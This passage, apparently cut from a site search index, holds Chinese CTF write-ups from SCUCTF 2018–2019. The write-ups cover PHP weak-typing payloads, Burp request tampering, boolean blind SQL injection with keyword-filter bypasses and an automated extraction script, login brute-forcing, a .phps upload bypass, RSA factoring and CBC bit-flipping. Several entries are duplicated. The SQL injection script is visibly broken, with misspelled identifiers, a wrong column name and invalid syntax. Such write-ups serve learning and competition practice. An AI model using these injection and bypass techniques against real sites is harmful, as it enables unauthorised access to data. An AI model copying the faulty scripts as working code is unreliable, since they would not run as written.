\u5f31\u7c7b\u578b\u8bed\u8a00\u7684\u5224\u65ad\u6f0f\u6d1e\uff0c\u7528\u54c8\u5e0c\u503c\u5f00\u5934\u662f 0e \u7684\u6784\u9020 payload; \u83b7\u53d6\u542b\u6709 flag \u94fe\u63a5\u7684\u7f51\u9875\uff0c\u70b9\u8fdb\u53bb\u53d1\u73b0\u6ca1\u6709\u8bbf\u95ee\u6743\u9650\u3002\u5c1d\u8bd5\u5404\u79cd\u65b9\u6cd5\u66f4\u6539 http \u5934\u90e8\u5185\u5bb9\uff0c\u6dfb\u52a0 refer,\u66f4\u6539 cookie\u2026\u2026Burpsuit \u6293\u5305\u66f4\u6539 permission \u4e3a nqzva(rot13 \u52a0\u5bc6\u540e\u7684 admin) Burpsuit \u53ef\u4ee5\u770b\u5230\u8fd4\u56de\u4e86\u6587\u4ef6\u7684\u94fe\u63a5\uff0c\u76f4\u63a5\u8bbf\u95ee\u94fe\u63a5\u5e76\u6ca1\u6709\u4e1c\u897f\u3002\u518d\u5c06\u8bf7\u6c42\u653e \u5728 burpsuite \u67e5\u770b\uff0c\u8fd4\u56de too slow\u3002\u8003\u8651\u7528\u811a\u672c\u3001burpsuit \u4e0d\u65ad\u53d1\u5305\u8bf7\u6c42\u3002 Burpsuite\u2014\u2014>Send to Intruder\u2014\u2014>Payload\u2014\u2014>Generate 100 payloads \u2014\u2014>Start attack; \u811a\u672c\u5982\u4e0b import requests r1 = requests . Session () while ( 1 ): r2 = r1 . get ( \"http://120.78.66.77:85/u/18f6dceefd3014a4b73e4b131776afa248ea810c/flag\" ) print ( r2 . text ) \u7136\u540e\u53ef\u4ee5\u5f97\u5230\u7ed3\u679c\u5982\u4e0b\u56fe\u6240\u793a\uff1a","title":"\u4e00\u9053\u5165\u95e8\u7684\u4ee3\u7801\u5ba1\u8ba1"},{"location":"2018/Web/#_4","text":"\u8003\u67e5\u8981\u70b9\uff1a SQL \u6ce8\u5165 \u6253\u5f00\u9898\u76ee\u5730\u5740\uff0c\u53d1\u73b0\u662f\u4e2a\u767b\u5f55\u754c\u9762\uff0c\u5148\u8d70\u6d41\u7a0b\uff0c\u7528\u4ee3\u7897\u5b66\u59d0\u6700\u65b0\u6362\u7684 AWVS10.5 \u626b\u4e00\u626b\u8fd9\u4e2a\u7f51\u7ad9\uff0c\u770b\u770b\u6709\u6ca1\u6709\u6e90\u7801\u6cc4\u6f0f\u6216\u8005\u5176\u4ed6\u53ef\u4ee5\u626b\u5230\u7684\u6f0f\u6d1e\uff0c\u4e00\u822c\u6765\u8bb2\u7528 AWVS \u53ef\u4ee5\u626b\u5230\u4e00\u4e9b\u51fa\u9898\u4eba\u6545\u610f\u7559\u4e0b\u7684\u7ebf\u7d22\uff0c\uff08\u5982 git \u6cc4\u6f0f\uff0csvn \u6cc4\u6f0f\u6216\u8005.bak \u6cc4\u6f0f\u7b49\u7b49\uff09\uff0c\u626b\u63cf\u51fa\u4e86\u51e0\u4e2a\u5217\u76ee\u5f55\u7684\u6f0f\u6d1e\u4f46\u662f\u5e76\u6ca1\u6709\u4ec0\u4e48\u7528\u3002 \u63a5\u7740\u7528 Burp \u6293\u5305\uff0c\u770b\u770b\u670d\u52a1\u5668\u7ed9\u6211\u4eec\u8fd4\u56de\u7684\u5305\u91cc\u9762\u6709\u4ec0\u4e48\u7ebf\u7d22\uff08burp \u7684\u4f7f\u7528\u6559\u7a0b http://www.uml.org.cn/safe/201406135.asp \uff09\u5728\u6d4f\u89c8\u5668\u4e2d\u8bbe\u7f6e\u6210 burp \u4f7f\u7528\u7684\u4ee3\u7406\uff0c\u7136\u540e\u8bbf\u95ee\u767b\u5f55\u9875\u9762\uff0c\u53d1\u73b0\u4e86\u63d0\u793a\u3002\u987a\u4fbf\u4e00\u63d0\uff0c\u5c3d\u7ba1\u8fd9\u9053\u9898\u4e2d\u51fa\u9898\u4eba\u628a\u63d0\u793a\u85cf\u5728\u4e86\u9875\u9762\u6e90\u7801\u4e2d\uff0c\u53ef\u4ee5\u76f4\u63a5\u5728\u6d4f\u89c8\u5668\u91cc\u770b\u5230\uff0c\u5927\u5e08\u5176\u4ed6\u9898\u7ed9\u7684\u63d0\u793a\u6709\u53ef\u80fd\u5728 cookies \u751a\u81f3\u670d\u52a1\u5668\u81ea\u5b9a\u4e49\u7684\u8fd4\u56de\u5934\u91cc\u9762\uff0c\u800c\u8fd9\u4e9b\u4e1c\u897f\u90fd\u80fd\u5728 burp \u7684\u6293\u5305\u4e2d\u770b\u5230\uff0c\u6240\u4ee5\u6211\u4eec\u6700\u597d\u8fd8\u662f\u7528 burp \u6765\u627e hint \u63d0\u793a\u544a\u8bc9\u4e86\u6211\u4eec\u6570\u636e\u5e93\u7684\u4e00\u4e9b\u4fe1\u606f\uff0c\u7ed3\u5408\u9898\u76ee\u53ef\u4ee5\u731c\u5230\u662f\u8981\u6211\u4eec\u901a\u8fc7 SQL \u6ce8\u5165\u6765\u83b7\u53d6\u5bc6\u7801\u3002 \u6d4b\u8bd5\u8fd9\u9053\u9898\u5bf9\u4e0a\u4f20\u6570\u636e\u7684\u9650\u5236\uff0c\u6211\u4eec\u9996\u5148\u53d1\u73b0\u5982\u679c\u6211\u4eec\u63d0\u4ea4\u7684\u6570\u636e\u4e2d\u5904\u51fa\u73b0\u4e86\u5173\u952e\u5b57\uff0c\u670d\u52a1\u5668\u5c31\u4f1a\u8fd4\u56de naive\u3002\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u670d\u52a1\u5668\u662f\u5426\u8fd4\u56de na\u00efve \u6765\u6d4b\u8bd5\u4e00\u4e2a\u5173\u952e\u5b57\u662f\u5426\u88ab\u7981\u6b62\uff0c\u7ecf\u8fc7\u624b\u52a8\u6d4b\u8bd5\uff08\u5176\u5b9e\u6700\u597d\u81ea\u5df1\u51c6\u5907\u4e00\u4efd\u5b57\u5178\u7528 burp \u6279\u91cf\u6d4b\u8bd5\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u53d1\u73b0\u88ab\u7981\u6b62\u7684\u5173\u952e\u5b57\u6709\uff1aunion select from where and \u4ee5\u53ca\u7a7a\u683c\u548c\u7a7a\u683c\u7684\u5404\u7c7b\u66ff\u4ee3\uff08%0a %0b /**/\u4e4b\u7c7b\uff09 substr \u8fd8\u6709/*\u3002\u5404\u7c7b\u7ed5\u8fc7\u624b\u6bb5\u5747\u65e0\u6548\uff0c\u5982\u5927\u5c0f\u5199\u66ff\u6362\uff0cURL \u7f16\u7801 \u770b\u4f3c\u65e0\u89e3\u7684\u9898\u76ee\u5728\u6709 hint \u7684\u60c5\u51b5\u4e0b\u6211\u4eec\u4ecd\u65e7\u80fd\u591f\u6784\u9020\u8bed\u53e5\u6765\u7ed5\u8fc7\u5b83\u3002\u5728\u6211\u4eec\u53d1\u52a8 SQL \u6ce8\u5165\u653b\u51fb\u524d\uff0c\u6211\u4eec\u8981\u9996\u5148\u5224\u65ad\u8fd9\u4e2a\u6ce8\u5165\u70b9\u7684\u7c7b\u578b\uff0c\u4e00\u822c\u7684\u6ce8\u5165\u6709 UNION \u6ce8\u5165\uff0c\u62a5\u9519\u6ce8\u5165\uff0c\u5e03\u5c14\u6ce8\u5165\uff0c\u4ee5\u53ca\u65f6\u95f4\u5dee\u6ce8\u5165\uff08\u7c7b\u4f3c DNS \u6ce8\u5165\u7684\u9ed1\u79d1\u6280\u5148\u4e0d\u7ba1\uff09\u3002 \u8fd9\u9053\u9898\u628a Union \u5173\u952e\u5b57\u7ed9\u9650\u5236\u4e86\uff0c\u8fd8\u4e0d\u62a5\u9519.\u56e0\u6b64\u6211\u4eec\u9996\u5148\u8003\u8651\u5e03\u5c14\u6ce8\u5165\u3002\u5e03\u5c14\uff08BOOL) \u8fd9\u4e2a\u542c\u8d77\u4f86\u5f88\u5947\u602a\uff0c\u5176\u5b9e\u8bf4\u767d\u4e86\u5c31\u662f\u6784\u9020\u5224\u65ad\u8bed\u53e5\u8ba9\u670d\u52a1\u5728\u8bed\u53e5\u7ed3\u679c\u4e3a\u771f\u6216\u8005\u4e3a\u5047\u7684\u65f6\u5019 \u8fd4\u518b\u4e0d\u540c\u7ed3\u679c\uff0c\u636e\u6b64\u6765\u83b7\u53d6\u4fe1\u606f\u3002 \u53ef\u4ee5\u53d1\u73b0\u5982\u679c\u7528\u6237\u540d\u8f93\u5165 admin\uff0c\u5bc6\u7801\u4e71\u8f93\uff0c\u4f1a\u63d0\u793a\u6211\u4eec password error,\u4f46\u5982\u679c\u662f\u5176\u5b83\u7528 \u6237\u540d\uff0c\u5b83\u5c31\u4f1a\u63d0\u793a no such user\u3002\u8fd9\u8868\u660e\u53ef\u80fd\u53ef\u4ee5\u5728\u7528\u6237\u540d\u90a3\u91cc\u4e0b\u624b\u6ce8\u5165\u3002 \u6d4b\u8bd5\u53d1\u73b0\u7528\u6237\u540d\u4e3a admin\u2019&&(1)# \u4e3a password error\uff0c\u4e3a admin\u2019&&(0)#\u65f6\u4e3a no such user,\u5e03\u5c14\u6ce8\u5165\u5b9e\u9524\uff01\u8fd9\u4e2a&&\u7684\u610f\u601d\u662f\u548c\uff0c\u53ef\u4ee5\u4ee3\u66ff and\uff0c\u800c#\u662f\u6ce8\u91ca\u7b26\u53f7\u7528\u4e8e\u6ce8\u91ca\u540e\u9762\u7684\u8bed\u53e5\u3002 \u6211\u4eec\u53ef\u4ee5\u5047\u5b9a\u8fd9\u4e2a\u767b\u5f55\u8bed\u53e5\u662f\u8fd9\u6837\u7684 select pwd from table name where uname= \u2019\u4f60\u8f93\u5165\u7684\u2019 \u628a\u521a\u521a\u8f93\u5165\u7684\u4ee3\u8fdb\u53bb\u5c31\u662f select pwd from table_name where uname=\u2019adminl&&(1)#' ,\u5982\u679c\u62ec\u53f7\u5185\u7684\u5185\u5bb9\u4e3a\u771f\uff08\u975e 0)\u5c31\u80fd\u591f\u8fd4\u56de\u7ed3\u679c\uff08password error)\uff0c\u4e0d\u80fd\u7684\u8bdd\u5c31\u65e0\u6cd5\u8fd4\u56de (no such user) \u73b0\u5728\u5f00\u59cb\u5c1d\u8bd5\u628a\u521a\u624d\u62ec\u53f7\u5185\u7684\u5185\u5bb9\u6362\u6210 length(pwd),\u8fd9\u4e2a length \u51fd\u6570\u53ef\u4ee5\u53d6\u4e00\u4e2a\u5b57\u7b26\u4e32\u7684\u957f\u5ea6,\u6574\u4e2a\u8bed\u53e5\u5c31\u6210\u4e86 select pwd from table_name where uname='adminl&&(length(pwd) )#\u2019 \u8fd4\u56de\u7684\u662f password error! \u8fd9\u8bf4\u660e pwd \u771f\u7684\u5b58\u5728\uff0c\u800c\u4e14\u53ef\u8bbf\u95ee\uff0c\u4e8e\u662f\u6211\u4eec\u53ef\u4ee5\u52a0\u4e0a\u5404\u7c7b\u5224\u65ad\u8bed\u53e5\u6765\u5224\u65ad pwd \u7684\u957f\u5ea6 \u4e8e\u662f\u5c31\u75af\u72c2\u6d4b\u8bd5 \u5728\u6d4b\u8bd5\u7684\u65f6\u5019\uff0c\u65b9\u4fbf\u8d77\u89c1.\u53ef\u4ee5\u628a\u6293\u5230\u7684\u767b\u5f55\u5305\u653e\u5728 Burp \u7684 repeater \u4e2d\uff0c\u4f46\u662f\u4e00\u5b9a\u8981\u628a& \u6362\u6210\uff0526,\u5426\u5219\u670d\u52a1\u5668\u4f1a\u628a&\u540e\u9762\u7684\u5f53\u4f5c\u53e6\u4e00\u4e2a\u4e0a\u4f20\u7684\u53c2\u6570\u3002\u53d1\u73b0\u8fd9\u4e2a\u5bc6\u7801\u957f\u5ea6\u4e3a 30 (\u5988\u7684\u771f\u591f\u957f\uff09 \u6211\u4eec\u73b0\u5728\u9700\u8981\u8003\u8651\u5982\u4f55\u8dd1\u51fa\u6570\u636e\u4e2b\uff0c\u6b63\u5e38\u7684\u5e03\u5c14\u6ce8\u5165\u9700\u8981\u7528 substr \u51fd\u6570\u4e00\u4e2a\u4e00\u4e2a\u5730\u53d6\u6570\u636e \uff0c\u4f46\u662f\u6211\u4eec\u7684 substr \u88ab\u7981\u4e86\u600e\u4e48\u529e\u5462\uff1f\u6211\u4eec\u8fd8\u6709 left \u548c right \u51fd\u6570\u53ef\u4ee5\u53d6\u3002\u811a\u672c\u5982\u4e0b\uff1a import requests from concurrent.futures import ThreadPoolExecutor from concurrent import futures url = \"http://120.78.66.77:84/fb69d7b4467e33c71b0153e62f7e2bf0/\" head = { \"Content-Type\" : \"application/x-www-form-unlencoded\" } #\u4e0d\u52a0\u4e0a\u670d\u52a1\u5668\u4e0d\u8ba4 data = \"uname=admin' %26% 26ascii(right(left(pwd,curlen),1))-curascii#&pwd=\" pwd = '_' * 31 def Check ( curlen ): global pwd data = \"uname=admin' %26% 26ascii(right(left(pod,curlen),1))BOOL#&pwd=\" . replace ( \"curlen\" , str ( curlen )) #\u5148\u66ff\u6362\u4f4d\u6570 start = 0 end = 255 while start <= end : #\u6b64\u5904\u4e8c\u5206 mid = ( start + end ) // 2 page = requests . post ( url = url , headers = head , data = data , replace ( \"BOOL\" , \"=\" + str ( mid ))) . text if \"error\" in page : pwd = pwd [: curlen ] + chr ( mid ) + pwd [ curlen + 1 :] print ( pwd [ 1 :]) return chr ( mid ) page = requests . post ( url = url , headers = head , data = data , replace ( \"BOOL\" , \"<\" + str ( mid ))) . text if \"error\" in page : end = mid - 1 else start = mid + 1 with ThreadPoolExecutor ( max_workders = 20 ) as executor : futurn_list = list () for curlen in range ( 1 , 31 ): future = executor . submit ( Check , curlen ) future_list . appent ( future ) print ( \"\u5bc6\u7801\u662f\" + pwd [ 1 :])","title":"\u767b\u5f55\u4e00\u4e0b"},{"location":"2018/Web/#_5","text":"\u8003\u67e5\u8981\u70b9\uff1a Linux \u5907\u4efd\u6587\u4ef6\uff0c\u8d26\u53f7\u5bc6\u7801\u7206\u7834\uff0cPHP \u6587\u4ef6\u540e\u7f00\u540d\u7ed5\u8fc7 \u5148 F12,\u770b\u5230\u63d0\u793a info.php \u53d1\u73b0 info.php \u88ab\u5220\u9664\uff0c\u770b\u770b\u5907\u4efd\u6587\u4ef6.bak \u67e5\u770b\u6587\u4ef6\uff0c\u6307\u660e\u4e86\u7206\u7834\u7684\u65b9\u5f0f\u548c\u8d26\u6237&\u5bc6\u7801\u96c6\u5408\uff0c\u53ea\u662f\u6709\u70b9\u5927\uff0c\u811a\u672c\u751f\u6210\u7206\u7834\u6587\u4ef6\uff0c\u914d\u7f6e\u5230 burp \u91cc\uff0c\u9759\u9759\u7b49\u5f85\u2026\u2026\u2026\u5927\u6982\u51e0\u5341\u5206\u949f\u5427 \u767b\u5f55\u540e\u8ba9\u4e0a\u4f20 PHP \u6587\u4ef6\uff0c\u7531\u6e90\u7801\u53d1\u73b0\u5176\u5b9e\u53ea\u662f\u4e0a\u4f20\u4e86\u6587\u4ef6\u540d\uff0c\u4f46\u662f\u666e\u901a\u7684 php \u6587\u4ef6\u65e0\u6cd5\u4e0a\u4f20\uff0c\u8fd9\u65f6\u60f3\u5230\u4e86 PHP \u7684\u4e00\u79cd\u522b\u540d\uff1aphps,\u4e00\u79cd\u7279\u6b8a\u7684 php \u6587\u4ef6\uff0c\u5f97\u5230 flag","title":"\u4e00\u9053\u8239\u7ec6\u7684\u5916\u90e8\u9898\u76ee"},{"location":"201905/Crypto/","text":"Crypto \u00b6 \u4f5b\u8bf4\uff0c\u8ba9\u4f60\u7b7e\u4e2a\u5230 \u00b6 \u8003\u67e5\u8981\u70b9 \u00b6 \u4e0e\u4f5b\u8bba\u7985 \u89e3\u9898\u8fc7\u7a0b \u00b6 \u4f7f\u7528\u4e0e\u4f5b\u8bba\u7985\u5bf9\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\uff0c\u83b7\u5f97\u660e\u6587 \u5173\u6ce8SCUCTF\u516c\u4f17\u53f7\u56de\u590dSCUCTF2019\u83b7\u5f97Flag \uff0c\u5173\u6ce8\u516c\u4f17\u53f7\u53d1\u9001\u6307\u5b9a\u6d88\u606f\u5373\u53ef\u83b7\u5f97 flag\u3002 512 \u4f4d RSA \u00b6 \u8003\u67e5\u8981\u70b9 \u00b6 RSA \u811a\u672c\u7f16\u5199 \u89e3\u9898\u8fc7\u7a0b \u00b6 \u9898\u76ee\u7ed9\u51fa\u7684\u5df2\u77e5\u6761\u4ef6\u6709 d\uff0cn \u548c e\uff0c\u8981\u6c42\u8ba1\u7b97 p+q \u7684\u54c8\u5e0c\u503c\u3002 \u5148\u8ba1\u7b97 k=d*e-1 k=d*e-1 \uff0c\u5373 k k \u4e3a \\varphi(n) \\varphi(n) \u7684\u500d\u6570 \u968f\u673a\u751f\u6210\u4e00\u4e2a\u4f4d\u4e8e 1 \u5230 n \u4e4b\u95f4\u7684 g\uff0c\u5982\u679c k\\ mod\\ 2=1 k\\ mod\\ 2=1 \uff0c\u5c31\u91cd\u65b0\u751f\u6210\u4e00\u4e2a g\uff0c \u5c06 k \u9664\u4ee5\u4e8c\uff0c\u53d8\u4e3a\u539f\u6765\u7684\u4e00\u534a\uff0c\u8ba1\u7b97 y=g^k\\ mod\\ n y=g^k\\ mod\\ n \u5f53 y \u4e0d\u4e3a 1\uff0c\u5373 k \u4e0d\u662f n \u7684\u6b27\u62c9\u51fd\u6570\u7684\u500d\u6570\uff0c\u4e14 y-1 \u548c n \u4e0d\u4e92\u7d20\u65f6\uff0cp \u548c q \u4e2d\u5176\u4e2d\u4e00\u4e2a\u4e3a y-1 \u548c p \u7684\u6700\u5927\u516c\u56e0\u6570\u3002 \u5982\u679c y \u4e3a 1 \u6216\u8005 y-1 \u4e0e n \u4e92\u7d20\uff0c\u5c31\u91cd\u65b0\u8fdb\u884c\u7b2c\u56db\u6b65\u3002 \u5982\u679c k\\ mod\\ 2=1 k\\ mod\\ 2=1 \uff0c\u5c31\u91cd\u65b0\u6267\u884c\u7b2c\u4e09\u6b65\u3002 import random import hashlib from pwn import * def gcd ( a , b ): if a < b : a , b = b , a while b != 0 : temp = a % b a = b b = temp return a def getpq ( n , e , d ): p = 1 q = 1 while p == 1 and q == 1 : k = d * e - 1 g = random . randint ( 0 , n ) while p == 1 and q == 1 and k % 2 == 0 : k /= 2 y = pow ( g , k , n ) if y != 1 and gcd ( y - 1 , n ) > 1 : p = gcd ( y - 1 , n ) q = n / p return p , q def main ( n , e , d ): p , q = getpq ( n , e , d ) md5 = hashlib . md5 () md5 . update ( str ( p + q )) return md5 . hexdigest () def get_flag ( host , port ): sh = remote ( host , port ) n = sh . recvline () n = n . split ( \"> \" )[ 1 ] n = eval ( n ) e = sh . recvline () e = e . split ( \"> \" )[ 1 ] e = eval ( e ) d = sh . recvline () d = d . split ( \"> \" )[ 1 ] d = eval ( d ) result = main ( n , e , d ) sh . sendline ( result ) print sh . recvline () if __name__ == '__main__' : get_flag ( \"120.78.66.77\" , 16000 ) X \u8ba1\u5212 \u00b6 \u8003\u67e5\u8981\u70b9 \u00b6 CBC \u6a21\u5f0f\u4e0b\u7684\u5b57\u8282\u53cd\u8f6c\u653b\u51fb \u89e3\u9898\u8fc7\u7a0b \u00b6 \u6536\u5230\u4e00\u4e2a 16 \u5b57\u8282\u7684\u660e\u6587\u548c CBC \u6a21\u5f0f\u4e0b\u4f7f\u7528 DES\uff0c\u968f\u673a key \u548c iv \u52a0\u5bc6\u7684\u5bc6\u6587\uff0c\u9700\u8981\u8f93\u5165\u4e00\u4e2a\u5bc6\u6587\uff0c\u4f7f\u4e4b\u4f7f\u7528\u76f8\u540c\u7684\u65b9\u5f0f\u89e3\u5bc6\u7ed3\u679c\u672b\u5c3e\u4e3a XXXX DES \u7684\u5206\u7ec4\u4e3a 8 \u5b57\u8282\u4e00\u7ec4\uff0c16 \u5b57\u8282\u521a\u597d\u4e24\u4e2a\u5206\u7ec4\uff0c\u63a5\u4e0b\u6765\u770b CBC \u6a21\u5f0f\u7684\u52a0\u5bc6\u539f\u7406\uff1a \u5373\u6211\u4eec\u53ea\u8981\u5c06\u7b2c\u4e00\u4e2a\u5bc6\u6587\u5206\u7ec4\u7684\u540e\u56db\u5b57\u8282\uff0c\u4e0e\u7b2c\u4e8c\u4e2a\u660e\u6587\u5206\u7ec4\u7684\u540e\u56db\u5b57\u8282\u5f02\u6216\uff0c\u518d\u548c\u56db\u4e2a X \u5f02\u6216\uff0c\u5373\u53ef\u8ba9\u89e3\u5bc6\u4e4b\u540e\u7684\u7b2c\u4e8c\u4e2a\u660e\u6587\u5206\u7ec4\u540e\u56db\u4e2a\u5b57\u8282\u4e3a X\u3002 # -*- coding: utf-8 -*- from Crypto.Util.number import long_to_bytes cipher = long_to_bytes ( 0x5dcebc74db3fb32b93f6fa4d5c9ec1e506b894a8f424e54 ) plain = \"wdzRBU7eyBqU4Hm4\" cipher = bytearray ( cipher ) cipher [ 4 ] = cipher [ 4 ] ^ ord ( plain [ 12 ]) ^ ord ( \"X\" ) cipher [ 5 ] = cipher [ 5 ] ^ ord ( plain [ 13 ]) ^ ord ( \"X\" ) cipher [ 6 ] = cipher [ 6 ] ^ ord ( plain [ 14 ]) ^ ord ( \"X\" ) cipher [ 7 ] = cipher [ 7 ] ^ ord ( plain [ 15 ]) ^ ord ( \"X\" ) result = \"\" for i in cipher : if len ( hex ( i )) == 4 : result += hex ( i )[ - 2 :] else : result += \"0\" + hex ( i )[ - 1 :] result = \"0x\" + result print result","title":"Crypto"},{"location":"201905/Crypto/#crypto","text":"","title":"Crypto"},{"location":"201905/Crypto/#_1","text":"","title":"\u4f5b\u8bf4\uff0c\u8ba9\u4f60\u7b7e\u4e2a\u5230"},{"location":"201905/Crypto/#_2","text":"\u4e0e\u4f5b\u8bba\u7985","title":"\u8003\u67e5\u8981\u70b9"},{"location":"201905/Crypto/#_3","text":"\u4f7f\u7528\u4e0e\u4f5b\u8bba\u7985\u5bf9\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\uff0c\u83b7\u5f97\u660e\u6587 \u5173\u6ce8SCUCTF\u516c\u4f17\u53f7\u56de\u590dSCUCTF2019\u83b7\u5f97Flag \uff0c\u5173\u6ce8\u516c\u4f17\u53f7\u53d1\u9001\u6307\u5b9a\u6d88\u606f\u5373\u53ef\u83b7\u5f97 flag\u3002","title":"\u89e3\u9898\u8fc7\u7a0b"},{"location":"201905/Crypto/#512-rsa","text":"","title":"512 \u4f4d RSA"},{"location":"201905/Crypto/#_4","text":"RSA \u811a\u672c\u7f16\u5199","title":"\u8003\u67e5\u8981\u70b9"},{"location":"201905/Crypto/#_5","text":"\u9898\u76ee\u7ed9\u51fa\u7684\u5df2\u77e5\u6761\u4ef6\u6709 d\uff0cn \u548c e\uff0c\u8981\u6c42\u8ba1\u7b97 p+q \u7684\u54c8\u5e0c\u503c\u3002 \u5148\u8ba1\u7b97 k=d*e-1 k=d*e-1 \uff0c\u5373 k k \u4e3a \\varphi(n) \\varphi(n) \u7684\u500d\u6570 \u968f\u673a\u751f\u6210\u4e00\u4e2a\u4f4d\u4e8e 1 \u5230 n \u4e4b\u95f4\u7684 g\uff0c\u5982\u679c k\\ mod\\ 2=1 k\\ mod\\ 2=1 \uff0c\u5c31\u91cd\u65b0\u751f\u6210\u4e00\u4e2a g\uff0c \u5c06 k \u9664\u4ee5\u4e8c\uff0c\u53d8\u4e3a\u539f\u6765\u7684\u4e00\u534a\uff0c\u8ba1\u7b97 y=g^k\\ mod\\ n y=g^k\\ mod\\ n \u5f53 y \u4e0d\u4e3a 1\uff0c\u5373 k \u4e0d\u662f n \u7684\u6b27\u62c9\u51fd\u6570\u7684\u500d\u6570\uff0c\u4e14 y-1 \u548c n \u4e0d\u4e92\u7d20\u65f6\uff0cp \u548c q \u4e2d\u5176\u4e2d\u4e00\u4e2a\u4e3a y-1 \u548c p \u7684\u6700\u5927\u516c\u56e0\u6570\u3002 \u5982\u679c y \u4e3a 1 \u6216\u8005 y-1 \u4e0e n \u4e92\u7d20\uff0c\u5c31\u91cd\u65b0\u8fdb\u884c\u7b2c\u56db\u6b65\u3002 \u5982\u679c k\\ mod\\ 2=1 k\\ mod\\ 2=1 \uff0c\u5c31\u91cd\u65b0\u6267\u884c\u7b2c\u4e09\u6b65\u3002 import random import hashlib from pwn import * def gcd ( a , b ): if a < b : a , b = b , a while b != 0 : temp = a % b a = b b = temp return a def getpq ( n , e , d ): p = 1 q = 1 while p == 1 and q == 1 : k = d * e - 1 g = random . randint ( 0 , n ) while p == 1 and q == 1 and k % 2 == 0 : k /= 2 y = pow ( g , k , n ) if y != 1 and gcd ( y - 1 , n ) > 1 : p = gcd ( y - 1 , n ) q = n / p return p , q def main ( n , e , d ): p , q = getpq ( n , e , d ) md5 = hashlib . md5 () md5 . update ( str ( p + q )) return md5 . hexdigest () def get_flag ( host , port ): sh = remote ( host , port ) n = sh . recvline () n = n . split ( \"> \" )[ 1 ] n = eval ( n ) e = sh . recvline () e = e . split ( \"> \" )[ 1 ] e = eval ( e ) d = sh . recvline () d = d . split ( \"> \" )[ 1 ] d = eval ( d ) result = main ( n , e , d ) sh . sendline ( result ) print sh . recvline () if __name__ == '__main__' : get_flag ( \"120.78.66.77\" , 16000 )","title":"\u89e3\u9898\u8fc7\u7a0b"},{"location":"201905/Crypto/#x","text":"","title":"X \u8ba1\u5212"},{"location":"201905/Crypto/#_6","text":"CBC \u6a21\u5f0f\u4e0b\u7684\u5b57\u8282\u53cd\u8f6c\u653b\u51fb","title":"\u8003\u67e5\u8981\u70b9"},{"location":"201905/Crypto/#_7","text":"\u6536\u5230\u4e00\u4e2a 16 \u5b57\u8282\u7684\u660e\u6587\u548c CBC \u6a21\u5f0f\u4e0b\u4f7f\u7528 DES\uff0c\u968f\u673a key \u548c iv \u52a0\u5bc6\u7684\u5bc6\u6587\uff0c\u9700\u8981\u8f93\u5165\u4e00\u4e2a\u5bc6\u6587\uff0c\u4f7f\u4e4b\u4f7f\u7528\u76f8\u540c\u7684\u65b9\u5f0f\u89e3\u5bc6\u7ed3\u679c\u672b\u5c3e\u4e3a XXXX DES \u7684\u5206\u7ec4\u4e3a 8 \u5b57\u8282\u4e00\u7ec4\uff0c16 \u5b57\u8282\u521a\u597d\u4e24\u4e2a\u5206\u7ec4\uff0c\u63a5\u4e0b\u6765\u770b CBC \u6a21\u5f0f\u7684\u52a0\u5bc6\u539f\u7406\uff1a \u5373\u6211\u4eec\u53ea\u8981\u5c06\u7b2c\u4e00\u4e2a\u5bc6\u6587\u5206\u7ec4\u7684\u540e\u56db\u5b57\u8282\uff0c\u4e0e\u7b2c\u4e8c\u4e2a\u660e\u6587\u5206\u7ec4\u7684\u540e\u56db\u5b57\u8282\u5f02\u6216\uff0c\u518d\u548c\u56db\u4e2a X \u5f02\u6216\uff0c\u5373\u53ef\u8ba9\u89e3\u5bc6\u4e4b\u540e\u7684\u7b2c\u4e8c\u4e2a\u660e\u6587\u5206\u7ec4\u540e\u56db\u4e2a\u5b57\u8282\u4e3a X\u3002 # -*- coding: utf-8 -*- from Crypto.Util.number import long_to_bytes cipher = long_to_bytes ( 0x5dcebc74db3fb32b93f6fa4d5c9ec1e506b894a8f424e54 ) plain = \"wdzRBU7eyBqU4Hm4\" cipher = bytearray ( cipher ) cipher [ 4 ] = cipher [ 4 ] ^ ord ( plain [ 12 ]) ^ ord ( \"X\" ) cipher [ 5 ] = cipher [ 5 ] ^ ord ( plain [ 13 ]) ^ ord ( \"X\" ) cipher [ 6 ] = cipher [ 6 ] ^ ord ( plain [ 14 ]) ^ ord ( \"X\" ) cipher [ 7 ] = cipher [ 7 ] ^ ord ( plain [ 15 ]) ^ ord ( \"X\" ) result = \"\" for i in cipher : if len ( hex ( i )) == 4 : result += hex ( i )[ - 2 :] else : result += \"0\" + hex ( i )[ - 1 :] result = \"0x\" + result print result","title":"\u89e3\u9898\u8fc7\u7a0b"},{"location":"201905/Misc/","text":"MISC \u00b6 \u5a49\u59d0\u59d0\u7684\u5185\u5b58\u955c\u50cf \u00b6 \u8003\u67e5\u8981\u70b9 \u00b6 \u5185\u5b58\u9690\u5199 \u89e3\u9898\u8fc7\u7a0b \u00b6 \u4f7f\u7528 Volatility \u67e5\u770b\u526a\u5207\u677f\u4fe1\u606f\uff0c\u53d1\u73b0\u4e00\u6bb5 Base64 \u7f16\u7801\uff0c\u4f46\u663e\u793a\u4e0d\u5168\u3002 \u4f7f\u7528\u5341\u516d\u8fdb\u5236\u7f16\u8f91\u5668\u6253\u5f00\u6587\u4ef6\uff0c\u641c\u7d22\u8fd9\u6bb5 base64 \u7684\u5934 c2NlY3Rm \u83b7\u5f97\u5b8c\u6574\u7684 base64\uff0c\u89e3\u7801\u83b7\u5f97 flag\u3002 \u8c01\u662f\u534f\u4f1a\u6700\u5f3a\u7684\u4eba \u00b6 \u8003\u67e5\u8981\u70b9 \u00b6 \u6587\u4ef6\u62fc\u63a5 \u89e3\u9898\u8fc7\u7a0b \u00b6 \u6253\u5f00\u6587\u4ef6\u53d1\u73b0\u662f\u5f20\u56fe\u7247\uff0c\u663e\u793a\u7684\u662f JS \u4e4b\u7236\uff08\u6240\u4ee5\u653e\u8fd9\u5f20\u56fe\u662f\u4e3a\u63d0\u5021\u5f00\u6e90 \uff09\uff0c\u76f4\u63a5\u62d6\u8fdb HxD \u770b\u770b\u6709\u4ec0\u4e48\uff0c\u62c9\u5230\u6700\u540e\u770b\u5230\uff1a \u5f88\u660e\u663e\u7684 base64\uff0c\u89e3\u7801\u770b\u89c1\u4e00\u6bb5\u4ee3\u7801\uff1a \u540d\u5b57\u7b49\u4e8e des\uff0cvalue \u5c31\u662f\u5bc6\u6587\uff0cstr 